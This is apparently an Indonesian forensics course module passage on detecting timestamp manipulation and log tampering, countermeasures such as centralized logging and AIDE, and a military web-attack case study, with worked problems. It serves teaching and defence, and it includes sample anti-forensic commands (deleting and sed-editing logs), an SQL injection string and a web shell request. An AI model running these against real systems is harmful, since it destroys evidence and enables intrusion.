| Atribut MFT | Timestamps | Modifikasi oleh User |
|-------------|------------|---------------------|
| **$STANDARD_INFORMATION** | Created, Modified, Accessed, Entry Modified | Dapat dimanipulasi oleh timestomp |
| **$FILE_NAME** | Created, Modified, Accessed, Entry Modified | Tidak dapat dimanipulasi oleh tools biasa |

#### 4.5.2 Deteksi Timestamp Manipulation

Metode deteksi utama adalah membandingkan timestamp `$STANDARD_INFORMATION` dengan `$FILE_NAME`:

```bash
# Menggunakan Volatility untuk memeriksa MFT
python3 vol.py -f memory.raw windows.mftscan.MFTScan

# Menggunakan MFTECmd (Eric Zimmerman)
MFTECmd.exe -f '$MFT' --csv output/ --csvf mft_analysis.csv
```

Indikator manipulasi timestamp:

1. Timestamp `$STANDARD_INFORMATION` lebih lama dari `$FILE_NAME`
2. Created time lebih baru dari Modified time
3. Timestamp persis sama hingga milidetik (round numbers)
4. Timestamp tidak sesuai dengan konteks (misalnya file .docx dengan created date tahun 1990)

#### Solved Problem 13 ⭐⭐⭐

**Soal:** Investigator menemukan file `laporan_rahasia.pdf` dengan informasi berikut dari analisis MFT:

| Atribut | Created | Modified |
|---------|---------|----------|
| $STANDARD_INFORMATION | 2020-01-15 08:00:00 | 2020-01-15 08:00:00 |
| $FILE_NAME | 2025-02-10 14:23:45 | 2025-02-10 14:23:45 |

Apakah timestamp telah dimanipulasi? Jelaskan!

**Penyelesaian:**

*Step 1:* Bandingkan timestamp antar atribut MFT

*Step 2:* Evaluasi konsistensi

**Jawaban:** Ya, timestamp telah dimanipulasi. Buktinya: (1) Timestamp `$STANDARD_INFORMATION` menunjukkan tahun 2020, sedangkan `$FILE_NAME` menunjukkan tahun 2025. Ini anomali karena `$FILE_NAME` timestamp di-update oleh kernel Windows dan tidak dapat diubah oleh tools user-level. (2) Timestamp asli file adalah yang ada di `$FILE_NAME` (10 Februari 2025), bukan yang di `$STANDARD_INFORMATION` (15 Januari 2020). (3) Created dan Modified pada `$STANDARD_INFORMATION` persis sama, menunjukkan perubahan oleh tool seperti timestomp yang men-set kedua nilai identik.

---

### 4.6 Trail Obfuscation: Log Tampering

> **Log Tampering** adalah teknik memodifikasi, menghapus, atau memalsukan entri log untuk menghilangkan jejak aktivitas penyerang atau menyesatkan investigasi forensik.

#### 4.6.1 Teknik Log Tampering

| Teknik | Metode | Contoh |
|--------|--------|--------|
| **Log Deletion** | Menghapus seluruh file log | `rm /var/log/auth.log` |
| **Selective Editing** | Menghapus entri tertentu dari log | `sed -i '/203.0.113.50/d' access.log` |
| **Log Rotation Abuse** | Memicu rotasi log prematur | `logrotate -f /etc/logrotate.conf` |
| **Timestamp Modification** | Mengubah waktu entri log | Edit langsung pada file log |
| **Log Injection** | Menyisipkan entri palsu | Inject fake entries ke log |

#### 4.6.2 Deteksi Log Tampering

```bash
# Cek integritas log dengan memeriksa gap dalam timestamp
awk '{print $4}' access.log | sed 's/\[//' | sort | uniq -c | sort -rn

# Cek ukuran file log yang tidak wajar (terlalu kecil)
ls -la /var/log/apache2/

# Periksa inode modification time vs content timestamps
stat /var/log/apache2/access.log

# Cek apakah auditd mencatat akses ke file log
ausearch -f /var/log/apache2/access.log

# Verifikasi log dengan rsyslog remote logging
# Bandingkan log lokal dengan log di server terpusat
```

#### Solved Problem 14 ⭐⭐⭐

**Soal:** Investigator mencurigai log Apache telah dimanipulasi. Entri log menunjukkan gap 3 jam (dari 14:00 ke 17:00) tanpa request apapun pada hari kerja. Apa yang harus dilakukan investigator?

**Penyelesaian:**

*Step 1:* Verifikasi apakah gap tersebut normal atau hasil manipulasi

*Step 2:* Cari bukti pendukung

**Jawaban:** Investigator harus: (1) **Bandingkan dengan sumber lain**: periksa log firewall, IDS, atau network flow data untuk rentang waktu yang sama. (2) **Periksa metadata file log**: gunakan `stat` untuk melihat apakah file dimodifikasi setelah waktu terakhir entri log. (3) **Cek remote log**: jika syslog remote dikonfigurasi, bandingkan log lokal dengan log di server terpusat. (4) **Analisis filesystem**: periksa timeline filesystem untuk melihat apakah file log diakses/dimodifikasi pada waktu yang mencurigakan. (5) **Periksa bash history**: cari perintah yang digunakan untuk mengedit log seperti `sed`, `vi`, atau `nano` pada file log.

---

### 4.7 Attacks Against Forensic Tools

Teknik anti-forensik yang paling canggih menargetkan tools forensik itu sendiri:

| Teknik | Target | Contoh |
|--------|--------|--------|
| **Crafted Files** | File parsers | File yang crash Autopsy/EnCase |
| **Anti-VM** | Sandbox analysis | Malware yang mendeteksi VM dan mengubah perilaku |
| **Encryption** | Data recovery | Full disk encryption (BitLocker, VeraCrypt) |
| **Packed/Obfuscated** | Static analysis | UPX packing, custom packers |

#### Solved Problem 15 ⭐⭐

**Soal:** Jelaskan bagaimana full disk encryption (FDE) menjadi tantangan bagi investigator forensik dan langkah apa yang dapat diambil!

**Penyelesaian:**

*Step 1:* Identifikasi dampak FDE pada proses forensik

*Step 2:* Tentukan kemungkinan solusi

**Jawaban:** FDE menjadi tantangan karena: (1) Data pada disk tidak dapat dibaca tanpa kunci dekripsi yang benar. (2) Forensic imaging tetap bisa dilakukan, tetapi hasilnya berupa data terenkripsi. Langkah yang dapat diambil: (1) **Live acquisition**: jika sistem masih menyala dan volume terdekripsi, lakukan live imaging atau memory dump. (2) **Memory forensics**: kunci enkripsi mungkin tersimpan di RAM — ekstrak menggunakan Volatility. (3) **Key recovery**: periksa TPM, recovery key di Active Directory, atau escrowed keys. (4) **Legal compulsion**: dalam konteks militer, perintah atasan atau otoritas hukum dapat mewajibkan tersangka menyerahkan kunci.

---

## 5. Forensic Countermeasures

### 5.1 Strategi Pencegahan Anti-Forensik

> **Forensic Countermeasures** adalah prosedur dan teknologi yang diterapkan untuk mendeteksi, mencegah, dan mengatasi penggunaan teknik anti-forensik oleh penyerang.

| Countermeasure | Teknik Anti-Forensik yang Dicegah | Implementasi |
|----------------|----------------------------------|--------------|
| Centralized Logging | Log tampering, log deletion | Syslog ke server terpisah |
| Write-Once Media | Artifact wiping | WORM storage untuk log |
| File Integrity Monitoring | Timestamp manipulation, file modification | AIDE, Tripwire, OSSEC |
| Forensic Readiness | Semua teknik | Kebijakan, prosedur, training |
| Memory Acquisition | Data hiding, encryption | Automated memory dumping |

### 5.2 Implementasi Centralized Logging

```bash
# Konfigurasi rsyslog untuk mengirim log ke server terpusat
# /etc/rsyslog.d/50-remote.conf
*.* @@logserver.mil.id:514

# Konfigurasi Apache untuk remote logging
ErrorLog "| /usr/bin/logger -t apache_error -p local0.error"
CustomLog "| /usr/bin/logger -t apache_access -p local0.info" combined
```

### 5.3 File Integrity Monitoring dengan AIDE

```bash
# Inisialisasi database AIDE
aide --init
cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db

# Periksa integritas file
aide --check

# Output menunjukkan file yang berubah
# Changed: /var/log/apache2/access.log
#   Mtime: 2025-02-15 10:00:00 -> 2025-02-15 14:30:00
#   SHA256: abc123... -> def456...
```

#### Solved Problem 16 ⭐⭐⭐

**Soal:** Rancang strategi forensic countermeasures untuk web server sistem komando dan kendali (C2) di Kodam yang mencakup minimal 5 langkah!

**Penyelesaian:**

*Step 1:* Identifikasi aset kritis dan ancaman yang paling relevan

*Step 2:* Rancang countermeasures berlapis

**Jawaban:** Strategi forensic countermeasures: (1) **Centralized logging**: konfigurasi rsyslog untuk mengirim semua log ke server terpisah yang terproteksi dengan akses terbatas. (2) **File integrity monitoring**: implementasikan AIDE untuk memantau perubahan pada file kritis web server dan konfigurasi. (3) **Database audit logging**: aktifkan audit log pada database untuk mencatat semua query, terutama dari koneksi web application. (4) **Automated memory acquisition**: siapkan skrip untuk memory dump otomatis saat alert IDS terpicu. (5) **Network traffic capture**: implementasikan full packet capture pada segmen jaringan web server untuk korelasi dengan log.

---

## 6. Studi Kasus Terpadu: Serangan Web pada Infrastruktur Militer

### 6.1 Skenario

Sistem informasi logistik Kodam XVII/Cenderawasih melaporkan anomali pada tanggal 20 Februari 2025. Tim CERT menemukan indikasi berikut:

1. Lonjakan request dari IP `203.0.113.75` mulai pukul 02:00 WIT
2. Beberapa file PHP baru ditemukan di direktori `/uploads/`
3. Gap mencurigakan pada access log antara 03:00-04:00 WIT
4. File `inventory_report.xlsx` memiliki timestamp Created: 2019-06-15

### 6.2 Analisis

**Fase 1 — Log Analysis:**
```
203.0.113.75 - - [20/Feb/2025:02:01:15 +0900] "GET /login.php HTTP/1.1" 200 4521
203.0.113.75 - - [20/Feb/2025:02:05:33 +0900] "POST /login.php HTTP/1.1" 302 0
203.0.113.75 - - [20/Feb/2025:02:10:44 +0900] "GET /inventory.php?id=1' OR '1'='1-- HTTP/1.1" 200 12340
203.0.113.75 - - [20/Feb/2025:02:15:22 +0900] "POST /upload.php HTTP/1.1" 200 156
[GAP 03:00 - 04:00 WIT]
203.0.113.75 - - [20/Feb/2025:04:01:05 +0900] "GET /uploads/cmd.php?c=id HTTP/1.1" 200 28
```

**Fase 2 — Rekonstruksi Timeline:**

| Waktu (WIT) | Aktivitas | Jenis Serangan |
|-------------|-----------|----------------|
| 02:01 | Akses halaman login | Reconnaissance |
| 02:05 | Login berhasil | Credential compromise |
| 02:10 | SQL Injection pada parameter `id` | SQL Injection |
| 02:15 | Upload file ke server | Web shell upload |
| 03:00-04:00 | Gap pada log (dihapus) | Log tampering |
| 04:01 | Akses web shell | Post-exploitation |

**Fase 3 — Anti-Forensik yang Terdeteksi:**
- Log tampering (gap 1 jam)
- Timestamp manipulation pada file inventory (2019 vs 2025)
- Kemungkinan data exfiltration selama gap log

#### Solved Problem 17 ⭐⭐⭐

**Soal:** Berdasarkan studi kasus di atas, jelaskan langkah investigasi forensik yang harus dilakukan untuk menangani insiden ini!

**Penyelesaian:**

*Step 1:* Tentukan prioritas investigasi berdasarkan severity

*Step 2:* Susun langkah sistematis

**Jawaban:** Langkah investigasi: (1) **Containment**: isolasi web server dari jaringan untuk mencegah penyerang melanjutkan akses. (2) **Evidence preservation**: buat forensic image disk server dan memory dump sebelum perubahan lebih lanjut. (3) **Web shell analysis**: analisis file PHP di `/uploads/` — identifikasi fungsi, obfuscation, dan C2 communication. (4) **Log recovery**: periksa apakah log yang dihapus (03:00-04:00) dapat dipulihkan dari unallocated space atau remote log server. (5) **Database analysis**: periksa query log MySQL untuk menentukan data apa yang berhasil diekstrak melalui SQLi. (6) **Timestamp verification**: analisis MFT untuk memverifikasi timestamp asli file `inventory_report.xlsx`. (7) **Network forensics**: periksa log firewall dan NetFlow untuk mengidentifikasi data exfiltration selama gap log.

---

## 7. Best Practices dalam Investigasi Serangan Web

### 7.1 Checklist Investigasi

| No | Langkah | Keterangan |
|----|---------|------------|
| 1 | Preservasi log | Hash dan copy semua log sebelum analisis |
| 2 | Identifikasi scope | Tentukan sistem yang terdampak |
| 3 | Timeline construction | Bangun timeline dari semua sumber log |
| 4 | Attack vector analysis | Identifikasi entry point penyerang |
| 5 | Impact assessment | Tentukan data yang terkompromi |
| 6 | Anti-forensik check | Periksa tanda-tanda anti-forensik |
| 7 | IOC extraction | Dokumentasikan Indicators of Compromise |
| 8 | Reporting | Buat laporan forensik komprehensif |

### 7.2 OWASP Top 10 dan Relevansi Forensik

| Rank | Kerentanan | Artefak Forensik Utama |
|------|------------|----------------------|
| A01 | Broken Access Control | Access log, session data |
| A02 | Cryptographic Failures | Database dumps, transmission logs |
| A03 | Injection | Query logs, access logs, error logs |
| A04 | Insecure Design | Application logs |
| A05 | Security Misconfiguration | Server configs, default credentials |
| A06 | Vulnerable Components | Package versions, CVE databases |
| A07 | Authentication Failures | Auth logs, brute force patterns |
| A08 | Software Integrity Failures | File hashes, supply chain logs |
| A09 | Logging Failures | Absence of logs (anti-forensik!) |
| A10 | SSRF | Outbound connection logs |

#### Solved Problem 18 ⭐⭐

**Soal:** Mengapa "Logging Failures" (OWASP A09) sangat kritis dari perspektif forensik digital militer?

**Penyelesaian:**

*Step 1:* Analisis dampak ketiadaan log terhadap investigasi

*Step 2:* Hubungkan dengan konteks keamanan militer

**Jawaban:** Logging Failures sangat kritis karena: (1) **Tidak ada bukti**: tanpa log yang memadai, investigator tidak memiliki data untuk merekonstruksi serangan. (2) **Deteksi terlambat**: serangan mungkin berlangsung berhari-hari atau berminggu-minggu tanpa terdeteksi jika logging tidak dikonfigurasi dengan benar. (3) **Konteks militer**: pada sistem pertahanan, ketidakmampuan mendeteksi dan menginvestigasi serangan dapat berdampak pada keamanan nasional. (4) **Compliance**: standar keamanan militer mewajibkan audit trail yang lengkap.

---

## Supplementary Problems

### Problem S1 ⭐

**Soal:** Sebutkan tiga jenis serangan web yang paling umum ditemui pada investigasi forensik!

**Jawaban:** Tiga jenis serangan web paling umum: (1) SQL Injection — penyisipan perintah SQL melalui input, (2) Cross-Site Scripting (XSS) — penyisipan skrip berbahaya yang dieksekusi browser, (3) Cross-Site Request Forgery (CSRF) — pemaksaan request oleh pengguna terautentikasi tanpa sepengetahuannya.

---

### Problem S2 ⭐

**Soal:** Apa perbedaan antara steganografi dan kriptografi?

**Jawaban:** Steganografi menyembunyikan keberadaan pesan di dalam media lain sehingga tidak menimbulkan kecurigaan, sedangkan kriptografi melindungi isi pesan dengan enkripsi sehingga pesan terlihat ada tetapi tidak dapat dibaca tanpa kunci.

---

### Problem S3 ⭐⭐

**Soal:** Jelaskan apa itu Alternate Data Streams (ADS) dan mengapa relevan dalam forensik!

**Jawaban:** ADS adalah fitur NTFS yang memungkinkan penyimpanan data tersembunyi di dalam file normal. Relevan dalam forensik karena: (1) Tidak terlihat di Windows Explorer standar, (2) Bisa digunakan untuk menyembunyikan data atau malware, (3) Tool forensik seperti Autopsy dan `streams.exe` dapat mendeteksinya.

---

### Problem S4 ⭐⭐

**Soal:** Bagaimana cara mendeteksi penggunaan tool secure deletion (wiping) pada sistem tersangka?

**Jawaban:** Cara mendeteksi: (1) Periksa Prefetch files untuk jejak eksekusi wiping tools (BleachBit, CCleaner, Eraser, sdelete). (2) Periksa registry untuk entri instalasi program wiping. (3) Periksa Windows Event Log untuk Event ID 1102 (audit log cleared). (4) Periksa USN Journal dan Volume Shadow Copies untuk sisa artefak.

---

## Ringkasan

| Topik | Poin Utama |
|-------|-----------|
| Serangan Web | SQL Injection, XSS, CSRF — bukti utama ada di web server logs |
| Analisis Log | Apache/Nginx/IIS logs, HTTP status codes, pattern matching |
| Web Shell | Deteksi via grep fungsi berbahaya, file size anomali, timestamp |
| Anti-Forensik | Data hiding, artifact wiping, trail obfuscation, attacks against tools |
| Steganografi | LSB substitution, deteksi dengan StegSolve/zsteg/binwalk |
| Timestamp Manipulation | Bandingkan $STANDARD_INFORMATION vs $FILE_NAME pada MFT |
| Log Tampering | Deteksi gap, korelasi dengan remote log, filesystem timeline |
| Countermeasures | Centralized logging, FIM, forensic readiness |

---

## Referensi

1. Casey, E. (2022). *Digital Evidence and Computer Crime*. Chapter 13
2. Phillips, A., et al. (2022). *Guide to Computer Forensics and Investigations*. Chapter 10-11
3. Harris, R. (2006). *Arriving at an Anti-Forensics Consensus*. DFRWS
4. OWASP Web Security Testing Guide. https://owasp.org/www-project-web-security-testing-guide/
5. SecRepo Security Data Repository. https://www.secrepo.com/
6. CyberDefenders Blue Team Labs. https://cyberdefenders.org/
7. Honeynet Project Challenges. https://www.honeynet.org/challenges/

---

## License / Lisensi

*Modul ini dilisensikan di bawah [Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International](https://creativecommons.org/licenses/by-nc-sa/4.0/).*
